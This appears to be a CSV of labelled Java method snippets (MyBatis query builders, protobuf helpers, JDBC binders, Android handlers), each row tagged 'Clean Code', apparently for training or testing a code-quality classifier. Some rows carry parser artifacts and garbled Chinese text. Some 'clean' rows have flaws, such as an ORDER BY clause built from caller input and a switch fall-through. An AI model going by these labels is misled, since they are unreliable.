text,label,text_label
"@Override public CfAdLinksExample getExampleByQuery(CfAdLinksQuery cfAdLinksQuery){
  CfAdLinksExample cfAdLinksExample=new CfAdLinksExample();
  CfAdLinksExample.Criteria criteria=cfAdLinksExample.createCriteria();
  if (cfAdLinksQuery.getId() != null) {
    criteria.andIdEqualTo(cfAdLinksQuery.getId());
  }
  if (cfAdLinksQuery.getAdId() != null) {
    criteria.andAdIdEqualTo(cfAdLinksQuery.getAdId());
  }
  if (cfAdLinksQuery.getScenes() != null) {
    criteria.andScenesEqualTo(cfAdLinksQuery.getScenes());
  }
  if (cfAdLinksQuery.getPlatform() != null) {
    criteria.andPlatformEqualTo(cfAdLinksQuery.getPlatform());
  }
  if (cfAdLinksQuery.getCarrierId() != null) {
    criteria.andCarrierIdEqualTo(cfAdLinksQuery.getCarrierId());
  }
  if (cfAdLinksQuery.getCarrierIds() != null) {
    criteria.andCarrierIdIn(cfAdLinksQuery.getCarrierIds());
  }
  if (cfAdLinksQuery.getMinStartTime() != null) {
    criteria.andStartTimeGreaterThanOrEqualTo(cfAdLinksQuery.getMinStartTime());
  }
  if (cfAdLinksQuery.getMaxStartTime() != null) {
    criteria.andStartTimeLessThanOrEqualTo(cfAdLinksQuery.getMaxStartTime());
  }
  if (cfAdLinksQuery.getMinEndTime() != null) {
    criteria.andEndTimeGreaterThanOrEqualTo(cfAdLinksQuery.getMinEndTime());
  }
  if (cfAdLinksQuery.getMaxEndTime() != null) {
    criteria.andEndTimeLessThanOrEqualTo(cfAdLinksQuery.getMaxEndTime());
  }
  if (StringUtils.isNotEmpty(cfAdLinksQuery.getOrderBy())) {
    cfAdLinksExample.setOrderByClause(cfAdLinksQuery.getOrderBy());
  }
  if (cfAdLinksQuery.getPage() != null && cfAdLinksQuery.getSize() != null) {
    PageHelper.startPage(cfAdLinksQuery.getPage(),cfAdLinksQuery.getSize());
  }
  return cfAdLinksExample;
}
",0,Clean Code
"@PostMapping(value=""/sweep/requeue/{workflowId}"",produces=TEXT_PLAIN_VALUE) @Operation(summary=""Queue up all the running workflows for sweep"") public String requeueSweep(@PathVariable(""workflowId"") String workflowId){
  return adminService.requeueSweep(workflowId);
}
",0,Clean Code
"/** 
 * Storage init properties
 */
private void initProp(){
  Properties props=getProperties();
  String connectTimeoutInSecondsConf=props.getProperty(PROP_KEY_CONNECT_TIMEOUT_IN_SECONDS);
  String networkTimeoutInSecondsConf=props.getProperty(PROP_KEY_NETWORK_TIMEOUT_IN_SECONDS);
  String charsetConf=props.getProperty(PROP_KEY_CHARSET);
  String httpAntiStealTokenConf=props.getProperty(PROP_KEY_HTTP_ANTI_STEAL_TOKEN);
  String httpSecretKeyConf=props.getProperty(PROP_KEY_HTTP_SECRET_KEY);
  String httpTrackerHttpPortConf=props.getProperty(PROP_KEY_HTTP_TRACKER_HTTP_PORT);
  String poolEnabled=props.getProperty(PROP_KEY_CONNECTION_POOL_ENABLED);
  String poolMaxCountPerEntry=props.getProperty(PROP_KEY_CONNECTION_POOL_MAX_COUNT_PER_ENTRY);
  String poolMaxIdleTime=props.getProperty(PROP_KEY_CONNECTION_POOL_MAX_IDLE_TIME);
  String poolMaxWaitTimeInMS=props.getProperty(PROP_KEY_CONNECTION_POOL_MAX_WAIT_TIME_IN_MS);
  if (connectTimeoutInSecondsConf != null && !connectTimeoutInSecondsConf.trim().isEmpty()) {
    ClientGlobal.g_connect_timeout=Integer.parseInt(connectTimeoutInSecondsConf.trim()) * 1000;
  }
  if (networkTimeoutInSecondsConf != null && !networkTimeoutInSecondsConf.trim().isEmpty()) {
    ClientGlobal.g_network_timeout=Integer.parseInt(networkTimeoutInSecondsConf.trim()) * 1000;
  }
  if (charsetConf != null && !charsetConf.trim().isEmpty()) {
    ClientGlobal.g_charset=charsetConf.trim();
  }
  if (httpAntiStealTokenConf != null && !httpAntiStealTokenConf.trim().isEmpty()) {
    ClientGlobal.g_anti_steal_token=Boolean.parseBoolean(httpAntiStealTokenConf);
  }
  if (httpSecretKeyConf != null && !httpSecretKeyConf.trim().isEmpty()) {
    ClientGlobal.g_secret_key=httpSecretKeyConf.trim();
  }
  if (httpTrackerHttpPortConf != null && !httpTrackerHttpPortConf.trim().isEmpty()) {
    ClientGlobal.g_tracker_http_port=Integer.parseInt(httpTrackerHttpPortConf);
  }
  if (poolEnabled != null && !poolEnabled.trim().isEmpty()) {
    ClientGlobal.g_connection_pool_enabled=Boolean.parseBoolean(poolEnabled);
  }
  if (poolMaxCountPerEntry != null && !poolMaxCountPerEntry.trim().isEmpty()) {
    ClientGlobal.g_connection_pool_max_count_per_entry=Integer.parseInt(poolMaxCountPerEntry);
  }
  if (poolMaxIdleTime != null && !poolMaxIdleTime.trim().isEmpty()) {
    ClientGlobal.g_connection_pool_max_idle_time=Integer.parseInt(poolMaxIdleTime) * 1000;
  }
  if (poolMaxWaitTimeInMS != null && !poolMaxWaitTimeInMS.trim().isEmpty()) {
    ClientGlobal.g_connection_pool_max_wait_time_in_ms=Integer.parseInt(poolMaxWaitTimeInMS);
  }
}",0,Clean Code
"@Override public String toString(){
  return ""MyBean{"" + ""age="" + age + '}';
}
",0,Clean Code
"/** 
 * <code>optional .ItemCostList roll_buffs_cost = 14;</code>
 * @return this
 */
public RogueCommonBuffSelectInfo clearRollBuffsCost(){
  bitField0_&=~0x00000100;
  rollBuffsCost.clear();
  return this;
}",0,Clean Code
"public final Object convert(ResultSetMetaData metaData,ResultSet rs,int columnIndex,String encoding) throws Exception {
  int columnType=metaData.getColumnType(columnIndex);
  String columnName=metaData.getColumnName(columnIndex);
  String columnTypeName=metaData.getColumnTypeName(columnIndex);
  Object value=extract(rs,metaData,columnIndex,columnType,columnTypeName,columnName,encoding);
  LOG.debug(""value: {}"",value);
  return convert(value,columnType,columnName,columnTypeName);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@6befca7c",0,Clean Code
"private void readCommand(Command command) throws IOException {
  if (command != null) {
    while (!mClosed) {
      String line=mIn.readLine();
      if (line == null || mClosed) {
        break;
      }
      int pos=line.indexOf(TOKEN);
      if (pos > 0) {
        command.onUpdate(command.getID(),line.substring(0,pos));
      }
      if (pos >= 0) {
        line=line.substring(pos);
        String[] fields=line.split("" "");
        if (fields.length >= 2 && fields[1] != null) {
          int id=0;
          try {
            id=Integer.parseInt(fields[1]);
          }
 catch (          NumberFormatException ignored) {
          }
          int exitCode=-1;
          try {
            exitCode=Integer.parseInt(fields[2]);
          }
 catch (          NumberFormatException ignored) {
          }
          if (id == command.getID()) {
            command.setExitCode(exitCode);
            break;
          }
        }
      }
      command.onUpdate(command.getID(),line);
    }
  }
}",0,Clean Code
"public static Lookup _trustedLookup(Class<?> objectClass){
  if (GraalvmSupport.isGraalBuildtime()) {
    return _Lookup._trustedLookup(objectClass);
  }
  return lookupCache.get(objectClass);
}
",0,Clean Code
"public String toString(){
  return ""CommentForRead{id="" + this.id + "",postUser=""+ this.postUser+ "",createTime=""+ this.createTime+ "",content=""+ this.content+ "",replyCount=""+ this.replyCount+ "",vecReply=""+ this.vecReply+ "",likeInfo=""+ this.likeInfo+ "",richContents=""+ this.richContents+ "",sequence=""+ this.sequence+ "",}"";
}
",0,Clean Code
"@Override public AvatarExpUpScRsp clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  retcode=0;
  returnItemList.clear();
  return this;
}",0,Clean Code
"@Override public void write(MemoryBuffer buffer,ZoneId obj){
  fury.writeString(buffer,obj.getId());
}
",0,Clean Code
"@Override public EnhanceRogueBuffCsReq mergeFrom(final EnhanceRogueBuffCsReq other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasBuffId()) {
    setBuffId(other.buffId);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@71617386!org.eclipse.jdt.core.dom.MethodDeclaration@5c6041",0,Clean Code
"public MistralAiChatModelBuilder responseFormat(String responseFormat){
  this.responseFormat=responseFormat;
  return this;
}
public MistralAiChatModelBuilder responseFormat(MistralAiResponseFormatType responseFormat){
  this.responseFormat=responseFormat.toString();
  return this;
}
",0,Clean Code
String getA2(String uin);,0,Clean Code
"@Override public void run(SourceContext<T> ctx) throws Exception {
  Instant lastConsumeInstant=Instant.now();
  while (running) {
    ConsumerResult consumeResult=messagePullConsumer.getMessage();
    if (!consumeResult.isSuccess()) {
      if (!(consumeResult.getErrCode() == 400 || consumeResult.getErrCode() == 404 || consumeResult.getErrCode() == 405 || consumeResult.getErrCode() == 406 || consumeResult.getErrCode() == 407 || consumeResult.getErrCode() == 408)) {
        LOG.info(""Could not consume messages from tubemq (errcode: {}, "" + ""errmsg: {})."",consumeResult.getErrCode(),consumeResult.getErrMsg());
      }
      Duration idleTime=Duration.between(lastConsumeInstant,Instant.now());
      if (idleTime.compareTo(maxIdleTime) > 0) {
        ctx.markAsTemporarilyIdle();
      }
      continue;
    }
    List<Message> messageList=consumeResult.getMessageList();
    List<T> records=new ArrayList<>();
    if (messageList != null) {
      lastConsumeInstant=Instant.now();
      for (      Message message : messageList) {
        T record=deserializationSchema.deserialize(message.getData());
        records.add(record);
      }
    }
synchronized (ctx.getCheckpointLock()) {
      for (      T record : records) {
        ctx.collect(record);
      }
      currentOffsets.put(consumeResult.getPartitionKey(),consumeResult.getCurrOffset());
    }
    ConsumerResult confirmResult=messagePullConsumer.confirmConsume(consumeResult.getConfirmContext(),true);
    if (!confirmResult.isSuccess()) {
      if (!(confirmResult.getErrCode() == 400 || confirmResult.getErrCode() == 404 || confirmResult.getErrCode() == 405 || confirmResult.getErrCode() == 406 || confirmResult.getErrCode() == 407 || confirmResult.getErrCode() == 408)) {
        LOG.warn(""Could not confirm messages to tubemq (errcode: {}, "" + ""errmsg: {})."",confirmResult.getErrCode(),confirmResult.getErrMsg());
      }
    }
  }
}",0,Clean Code
"public int getPerLoadingMaterialType(){
  return this.perLoadingMaterialType;
}
",0,Clean Code
"public static EnhanceRogueBuffCsReq parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new EnhanceRogueBuffCsReq(),data).checkInitialized();
}
public static EnhanceRogueBuffCsReq parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new EnhanceRogueBuffCsReq(),input).checkInitialized();
}
public static EnhanceRogueBuffCsReq parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new EnhanceRogueBuffCsReq(),input).checkInitialized();
}
",0,Clean Code
"/** 
 * 绛旀鏍￠獙
 * @param project
 * @param request
 */
private void validateAnswer(ProjectView project,AnswerRequest request){
  List<SurveySchema> uniqueSchemaList=SchemaHelper.findSchemaListByAttribute(project.getSurvey(),""unique"",true);
  SchemaHelper.TreeNode treeNode=SchemaHelper.SurveySchema2TreeNode(project.getSurvey());
  uniqueSchemaList.forEach(optionSchema -> {
    String questionId=treeNode.getTreeNodeMap().get(optionSchema.getId()).getParent().getData().getId();
    Object questionValue=request.getAnswer().get(questionId);
    if (questionValue == null) {
      return;
    }
    String uniqueQuery=String.format(""\""%s\"":"",optionSchema.getId());
    if (SurveySchema.DataType.number == optionSchema.getAttribute().getDataType()) {
      uniqueQuery+=((Map)questionValue).get(optionSchema.getId());
    }
 else {
      uniqueQuery+=""\"""" + ((Map)questionValue).get(optionSchema.getId()) + ""\"""";
    }
    AnswerQuery query=new AnswerQuery();
    query.setProjectId(project.getId());
    query.setValueQuery(uniqueQuery);
    if (answerService.count(query) > 0) {
      String uniqueText=optionSchema.getAttribute().getUniqueText();
      throw new ValidationException(isNotBlank(uniqueText) ? uniqueText : ""闂嵎閲嶅淇濆瓨"");
    }
  }
);
  List<SurveySchema> hasQuotaSchemaList=SchemaHelper.findSchemaHasAttribute(project.getSurvey(),""quota"");
  if (hasQuotaSchemaList.size() > 0) {
    ProjectQuery query=new ProjectQuery();
    query.setId(request.getProjectId());
    PublicStatisticsView statisticsView=statProject(query);
    hasQuotaSchemaList.forEach(optionSchema -> {
      String questionId=treeNode.getTreeNodeMap().get(optionSchema.getId()).getParent().getData().getId();
      Object questionValue=request.getAnswer().get(questionId);
      if (questionValue == null) {
        return;
      }
      boolean optionNotChecked=((Map)questionValue).get(optionSchema.getId()) == null;
      if (optionNotChecked) {
        return;
      }
      PublicStatisticsView.QuestionStatistics questionStatistics=statisticsView.getQuestionStatistics().get(questionId);
      int optionSelectedCount=questionStatistics.getOptionStatistics().stream().filter(x -> x.getOptionId().equals(optionSchema.getId())).findFirst().orElse(new PublicStatisticsView.OptionStatistics()).getCount();
      Integer quota=optionSchema.getAttribute().getQuota();
      if (quota != null && optionSelectedCount + 1 > quota) {
        throw new ValidationException(""閫夐」鏁伴噺瓒呰繃闄愬埗锛岃閲嶆柊閫夋嫨"");
      }
    }
);
  }
}",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof SearchPlayerCsReq)) {
    return false;
  }
  SearchPlayerCsReq other=(SearchPlayerCsReq)o;
  return bitField0_ == other.bitField0_ && (!hasSearchUidList() || searchUidList.equals(other.searchUidList));
}",0,Clean Code
"@Override public void onClick(View v){
switch (v.getId()) {
case android.R.id.button1:
{
      if (mOnCheckedListener != null && mAdapter != null) {
        mOnCheckedListener.onChecked(mAdapter.getCheckedArray());
      }
    }
case android.R.id.button2:
{
    if (mData != null) {
      if (curWillCheckAll) {
        selectAll();
      }
 else {
        reverseSelect();
      }
      ((Button)v).setText(curWillCheckAll ? getResources().getString(R.string.miuix_appcompat_action_mode_inverse) : getResources().getString(R.string.miuix_appcompat_action_mode_select_all));
      curWillCheckAll=!curWillCheckAll;
    }
  }
}
}",0,Clean Code
"List<IGProIdentityInfo> getIdentityList();
",0,Clean Code
"private void buildParameter(PreparedStatement preparedStatement,Object parameter,Map<Integer,String> parameterMap) throws SQLException, IllegalAccessException {
  int size=parameterMap.size();
  if (parameter instanceof Long) {
    for (int i=1; i <= size; i++) {
      preparedStatement.setLong(i,Long.parseLong(parameter.toString()));
    }
    return;
  }
  if (parameter instanceof Integer) {
    for (int i=1; i <= size; i++) {
      preparedStatement.setInt(i,Integer.parseInt(parameter.toString()));
    }
    return;
  }
  if (parameter instanceof String) {
    for (int i=1; i <= size; i++) {
      preparedStatement.setString(i,parameter.toString());
    }
    return;
  }
  Map<String,Object> fieldMap=new HashMap<>();
  Field[] declaredFields=parameter.getClass().getDeclaredFields();
  for (  Field field : declaredFields) {
    String name=field.getName();
    field.setAccessible(true);
    Object obj=field.get(parameter);
    field.setAccessible(false);
    fieldMap.put(name,obj);
  }
  for (int i=1; i <= size; i++) {
    String parameterDefine=parameterMap.get(i);
    Object obj=fieldMap.get(parameterDefine);
    if (obj instanceof Short) {
      preparedStatement.setShort(i,Short.parseShort(obj.toString()));
      continue;
    }
    if (obj instanceof Integer) {
      preparedStatement.setInt(i,Integer.parseInt(obj.toString()));
      continue;
    }
    if (obj instanceof Long) {
      preparedStatement.setLong(i,Long.parseLong(obj.toString()));
      continue;
    }
    if (obj instanceof String) {
      preparedStatement.setString(i,obj.toString());
      continue;
    }
    if (obj instanceof Date) {
      preparedStatement.setDate(i,(java.sql.Date)obj);
    }
  }
}",0,Clean Code
